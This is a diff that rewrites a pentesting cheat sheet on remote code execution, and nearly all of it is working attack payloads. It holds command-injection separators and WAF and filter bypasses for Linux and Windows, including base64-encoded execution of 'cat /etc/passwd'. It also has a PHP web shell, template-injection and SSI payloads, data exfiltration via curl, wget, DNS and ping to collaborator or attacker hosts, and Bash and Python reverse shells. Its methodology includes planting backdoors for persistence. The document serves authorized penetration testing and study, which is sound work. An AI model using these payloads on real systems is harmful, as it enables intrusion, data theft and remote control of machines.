@@ -1,149 +1,377 @@
-**1. General Tips for RCE Exploitation**
+# Remote Code Execution (RCE) - Pentesting Notes
 
-- **Characters for Command Injection** : Use characters like `;`, `|`, `&`, `&&`, `||`, `\n`,$() (newline), and others to chain or separate commands.
-    - Example: `; whoami`
-    - Example: `&& whoami`
-    - Example: `| whoami`
-- **Output Redirection** :
-    - If direct command execution isn't possible, try redirecting output to a file you can access.
-        - Example: `whoami > output.txt`
-    - Ensure the file path is writable by the application.
-- **End Commands with Separators** :
-    - End your injected command with `&`, `;`, or similar to ensure subsequent input doesn't invalidate your payload.
-        - Example: `whoami &`
-- **Blind RCE** :
-    - If you cannot see the output directly, use blind techniques:
-        - **Ping** : `ping -c 1 <collaborator-domain>` or `ping -n 1 <collaborator-domain>`
-        - **DNS Exfiltration** : `nslookup $(whoami).<collaborator-domain>`
-        - **HTTP Requests** : `curl <http://$>(whoami).<collaborator-domain>`
+## Overview
+
+Remote Code Execution vulnerabilities allow attackers to execute arbitrary commands on a target system. This guide covers exploitation techniques, bypasses, and exfiltration methods for ethical pentesting.
 
 ---
 
-## **2. Ways of Injecting OS Commands**
+## Command Injection Fundamentals
 
-### **Command Separators**
+### Command Separators
 
-Use these characters to chain multiple commands together:
+**Cross-Platform:**
 
-- **Cross-Platform** :
-    - `&`: Runs the next command regardless of the success of the previous one.
-    - `&&`: Runs the next command only if the previous one succeeds.
-    - `|`: Pipes the output of the first command into the second.
-    - `||`: Runs the next command only if the previous one fails.
-- **Unix-Based Systems Only** :
-    - `;`: Separates commands sequentially.
-    - Newline (`\\n`): Executes commands line by line.
+- `;` - Separates commands sequentially (Unix only)
+- `&` - Runs next command regardless of previous result
+- `&&` - Runs next command only if previous succeeds
+- `|` - Pipes output of first command to second
+- `||` - Runs next command only if previous fails
+- `\n` (newline) - Executes commands line by line (Unix only)
 
-### **Inline Execution**
+**Inline Execution (Unix):**
 
-On Unix-based systems, use these techniques to execute commands inline within another command:
+- Backticks: `` `whoami` ``
+- Dollar parentheses: `$(whoami)`
 
-- Backticks: `injected command`
-    - Example: `whoami`
-- Dollar Parentheses: `$(` injected command `)`
-    - Example: `$(whoami)`
+### Injection Operators Reference
 
----
-
-## **3. Advanced RCE Techniques**
-
-### **Shell Escape Sequences**
-
-If the application escapes certain characters, try bypassing them using encoding or alternative syntax:
-
-- **Encoding** :
-    - URL encode special characters (e.g., `%3B` for `;`).
-    - Base64 encode payloads and decode them on the server:
-        - Example: `echo d2hvYW1p | base64 -d | bash`
-- **Using Variables** :
-    - Use environment variables or aliases to bypass filters:
-        - Example: `bash -c $'whoami'`
-        - Example: `$(echo -e "whoami")`
-
-### **File Uploads**
-
-Leverage file upload functionality to achieve RCE:
-
-- Upload a malicious file (e.g., `.php`, `.jsp`) and execute it via a web shell.
-- Example PHP payload: `<?php system($_GET['cmd']); ?>`
-
-### **Deserialization Vulnerabilities**
-
-Exploit deserialization flaws in frameworks or libraries to execute arbitrary code:
-
-- Craft serialized payloads that trigger RCE when deserialized.
-- Tools like `ysoserial` (Java) can help generate payloads.
-
-### **Template Injection**
-
-Inject payloads into templating engines (e.g., Jinja2, Twig):
-
-- Example: `{{ self.__init__.__globals__['os'].popen('whoami').read() }}`
-
-### **Server-Side Includes (SSI)**
-
-Inject SSI directives to execute commands:
-
-- Example: `<!--#exec cmd="whoami" -->`
-
-### **Log Poisoning**
-
-Inject malicious payloads into logs and access them via an exposed log viewer:
-
-- Example: Inject `<?php system('whoami'); ?>` into HTTP headers or user input.
+|Operator|Character|URL-Encoded|Behavior|
+|---|---|---|---|
+|Semicolon|`;`|`%3b`|Both commands execute|
+|New Line|`\n`|`%0a`|Both commands execute|
+|Background|`&`|`%26`|Both execute (second output first)|
+|Pipe|`|`|`%7c`|
+|AND|`&&`|`%26%26`|Both (only if first succeeds)|
+|OR|`||`|
+|Sub-Shell|`` ` ` ``|`%60%60`|Both (Linux only)|
+|Sub-Shell|`$()`|`%24%28%29`|Both (Linux only)|
 
 ---
 
-## **4. Bypass Filters and WAFs**
+## Exploitation Techniques
 
-### **Basic Bypasses**
+### Basic Command Injection
 
-- Use case variations to bypass simple filters:
-    - Example: `WhOaMi`
-- Use Unicode or encoded characters:
-    - Example: `\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069` → `whoami`
+```bash
+# Simple injection examples
+; whoami
+&& whoami
+| whoami
+```
 
-### **Advanced Bypasses**
+### Output Redirection
 
-- **Null Byte Injection** :
-    - Add a null byte (`%00`) to terminate strings prematurely:
-        - Example: `whoami%00`
-- **Double Encoding** :
-    - Encode special characters twice:
-        - Example: `%253B` → `;`
-- **Obfuscation** :
-    - Use built-in commands or aliases to obfuscate payloads:
-        - Example: `/bin/sh -c id`
-        - Example: `bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1`
+```bash
+# Redirect to accessible file
+whoami > output.txt
+id > /tmp/output.txt
+```
+
+### Blind RCE Techniques
+
+When command output isn't visible:
+
+**DNS Exfiltration:**
+
+```bash
+nslookup $(whoami).collaborator-domain.com
+```
+
+**HTTP Exfiltration:**
+
+```bash
+curl http://collaborator-domain.com/?data=$(whoami)
+wget http://collaborator-domain.com/$(whoami)
+```
+
+**ICMP (Ping):**
+
+```bash
+# Linux
+ping -c 1 collaborator-domain.com
+
+# Windows
+ping -n 1 collaborator-domain.com
+
+# Data exfiltration via ICMP
+ping -p $(whoami | xxd -p) <attacker-ip>
+```
 
 ---
 
-## **5. Data Exfiltration Techniques**
+## Advanced Exploitation Vectors
 
-### **DNS Exfiltration**
+### File Upload RCE
 
-- Use DNS queries to send data to a Collaborator server:
-    - Example: `nslookup $(whoami).<collaborator-domain>`
+Upload malicious files to achieve code execution:
 
-### **HTTP Exfiltration**
+**PHP Web Shell:**
 
-- Send data via HTTP requests:
-    - Example: `curl http://<collaborator-domain>/?data=$(whoami)`
+```php
+<?php system($_GET['cmd']); ?>
+```
 
-### **Ping Tunneling**
+### Template Injection
 
-- Use ICMP packets to exfiltrate data:
-    - Example: `ping -p $(whoami | xxd -p) <collaborator-ip>`
+Exploit templating engines:
+
+```python
+# Jinja2/Twig example
+{{ self.__init__.__globals__['os'].popen('whoami').read() }}
+```
+
+### Server-Side Includes (SSI)
+
+```html
+<!--#exec cmd="whoami" -->
+```
+
+### Log Poisoning
+
+Inject payloads into logs via HTTP headers or user input:
+
+```php
+<?php system('whoami'); ?>
+```
+
+### Deserialization Vulnerabilities
+
+- Craft serialized payloads for RCE
+- Tools: `ysoserial` (Java), `phpggc` (PHP)
 
 ---
 
-## **6. Common Tools for RCE**
+## Filter & WAF Bypasses
 
-- **Burp Suite** :
-    - Use Burp Collaborator to capture DNS/HTTP interactions.
-- **Netcat** :
-    - Set up a listener to catch reverse shells:
-        - Example: `nc -lvnp 4444`
-- **Reverse Shell Payloads** :
-    - Bash: `bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1`
-    - Python: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
+### Linux/Unix Bypasses
+
+#### Space Filtering
+
+|Technique|Example|
+|---|---|
+|Tab character|`%09` or `\t`|
+|IFS variable|`${IFS}` (not in sub-shells)|
+|Brace expansion|`{ls,-la}`|
+
+#### Character Substitution
+
+|Technique|Result|Example|
+|---|---|---|
+|Path variable|`/`|`${PATH:0:1}`|
+|LS_COLORS|`;`|`${LS_COLORS:10:1}`|
+|Character shift|`\`|`$(tr '!-}' '"-~'<<<[)`|
+
+#### Command Obfuscation
+
+**Character Insertion:**
+
+```bash
+# Quotes (must be even number)
+w'h'o'a'm'i
+w"h"o"a"m"i
+
+# Special variables (Linux)
+who$@ami
+who\ami
+```
+
+**Case Manipulation:**
+
+```bash
+# Execute regardless of case
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+```
+
+**Reversed Commands:**
+
+```bash
+# Reverse string
+echo 'whoami' | rev
+
+# Execute reversed
+$(rev<<<'imaohw')
+```
+
+**Base64 Encoding:**
+
+```bash
+# Encode
+echo -n 'cat /etc/passwd | grep 33' | base64
+
+# Decode and execute
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
+
+**Shell Escape Sequences:**
+
+```bash
+bash -c $'whoami'
+$(echo -e "whoami")
+```
+
+### Windows Bypasses
+
+#### Space Filtering
+
+|Technique|Example|Shell|
+|---|---|---|
+|Tab character|`%09`|Both|
+|PROGRAMFILES|`%PROGRAMFILES:~10,-5%`|CMD|
+|Environment var|`$env:PROGRAMFILES[10]`|PowerShell|
+
+#### Character Substitution
+
+|Technique|Result|Example|Shell|
+|---|---|---|---|
+|HOMEPATH|`\`|`%HOMEPATH:~0,-17%`|CMD|
+|Environment var|`\`|`$env:HOMEPATH[0]`|PowerShell|
+
+#### Command Obfuscation
+
+**Character Insertion:**
+
+```cmd
+# Quotes (CMD & PowerShell)
+w'h'o'a'm'i
+
+# Caret (CMD only)
+who^ami
+```
+
+**Case Manipulation:**
+
+```powershell
+# Windows is case-insensitive
+WhoAmi
+wHoAmI
+```
+
+**Reversed Commands:**
+
+```powershell
+# Reverse string
+"whoami"[-1..-20] -join ''
+
+# Execute reversed
+iex "$('imaohw'[-1..-20] -join '')"
+```
+
+**Base64 Encoding:**
+
+```powershell
+# Encode
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+# Decode and execute
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
+
+### General Bypasses
+
+**URL Encoding:**
+
+```
+%3B = ;
+%0a = newline
+%26 = &
+```
+
+**Double Encoding:**
+
+```
+%253B = ; (encoded twice)
+```
+
+**Unicode Encoding:**
+
+```
+\u0077\u0068\u006f\u0061\u006d\u0069 = whoami
+```
+
+**Null Byte Injection:**
+
+```
+whoami%00
+```
+
+**Alternative Command Paths:**
+
+```bash
+/bin/sh -c id
+/usr/bin/id
+```
+
+---
+
+## Reverse Shells
+
+### Bash
+
+```bash
+bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
+```
+
+### Python
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+### Netcat Listener
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## Essential Tools
+
+### Burp Suite
+
+- **Burp Collaborator**: Capture out-of-band DNS/HTTP interactions
+- **Intruder**: Automate payload testing
+- **Repeater**: Manual request manipulation
+
+### Command Line Tools
+
+- **netcat**: Reverse shell listener
+- **curl/wget**: HTTP exfiltration testing
+- **nslookup/dig**: DNS exfiltration testing
+
+### Environment Discovery
+
+```bash
+# Linux
+printenv
+
+# Windows CMD
+set
+
+# Windows PowerShell
+Get-ChildItem Env:
+```
+
+---
+
+## Testing Methodology
+
+1. **Identify injection points**: Form inputs, URL parameters, headers
+2. **Test for command execution**: Start with simple commands (`whoami`, `id`)
+3. **Determine OS**: Use OS-specific commands
+4. **Bypass filters**: Apply encoding/obfuscation techniques
+5. **Establish persistence**: Upload shells or create backdoors
+6. **Exfiltrate data**: Use blind techniques if needed
+7. **Document findings**: Record all successful payloads and responses
+
+---
+
+## Best Practices
+
+- Always test in authorized environments only
+- Document all testing activities
+- Use out-of-band techniques for blind vulnerabilities
+- Start with least invasive tests
+- Escalate complexity as needed
+- Clean up artifacts after testing
+
+---
+
+## Additional Resources
+
+- OWASP Command Injection Guide
+- HackTricks - Command Injection
+- PayloadsAllTheThings Repository
+- Burp Suite Documentation
